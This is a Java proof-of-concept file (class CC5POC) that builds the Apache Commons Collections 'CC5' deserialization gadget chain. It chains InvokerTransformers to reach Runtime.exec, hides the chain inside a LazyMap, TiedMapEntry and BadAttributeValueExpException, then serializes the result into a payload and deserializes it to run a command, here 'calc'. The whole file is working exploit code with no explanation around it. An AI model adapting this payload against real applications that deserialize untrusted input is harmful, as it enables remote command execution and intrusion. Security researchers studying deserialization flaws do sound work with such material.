
      import java.io.ByteArrayInputStream;
      import java.io.ByteArrayOutputStream;
      import java.lang.reflect.Field;
      import java.util.HashMap;
      import java.util.Map;                       
      import org.apache.commons.collections.Transformer;
      import org.apache.commons.collections.functors.ChainedTransformer;
      import org.apache.commons.collections.functors.ConstantTransformer;
      import org.apache.commons.collections.functors.InvokerTransformer;
      import org.apache.commons.collections.keyvalue.TiedMapEntry;
      import org.apache.commons.collections.map.LazyMap;
      import javax.management.BadAttributeValueExpException;
      import java.io.ObjectOutputStream;
      import java.io.ObjectInputStream;

      public class CC5POC {
         public static void main(String[] args) throws Exception {
            ConstantTransformer ct =new ConstantTransformer(Runtime.class);
            InvokerTransformer i1=new InvokerTransformer("getMethod",
            new Class[]{String.class,Class[].class},
         new Object[]{"getRuntime",new Class[0]});
            InvokerTransformer i2=new InvokerTransformer("invoke",
            new Class[]{Object.class,Object[].class},
            new Object[]{null,new Object[0]});
            InvokerTransformer i3=new InvokerTransformer("exec", 
                  new Class[]{String.class},
                  new Object[]{"calc"}
            );
            Transformer[] transformers = new Transformer[]{ct,i1,i2,i3};
            ChainedTransformer chain = new ChainedTransformer(transformers);


            HashMap map = new HashMap();
            LazyMap lazyMap=(LazyMap)LazyMap.decorate(map, chain);

            TiedMapEntry entry=new TiedMapEntry(lazyMap, "key");

            BadAttributeValueExpException val=new BadAttributeValueExpException(null);

            Field v=BadAttributeValueExpException.class.getDeclaredField("val");
            v.setAccessible(true);
            v.set(val, entry);


            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream out = new ObjectOutputStream(bos);
            out.writeObject(val);
            out.flush();
            out.close();
            byte[] payload = bos.toByteArray();
            System.out.println("Payload generated successfully!");


            ByteArrayInputStream bis = new ByteArrayInputStream(payload);
            ObjectInputStream ois = new java.io.ObjectInputStream(bis); 
            ois.readObject();
            ois.close();
            System.out.println("Payload deserialized successfully!");
         }
      }
    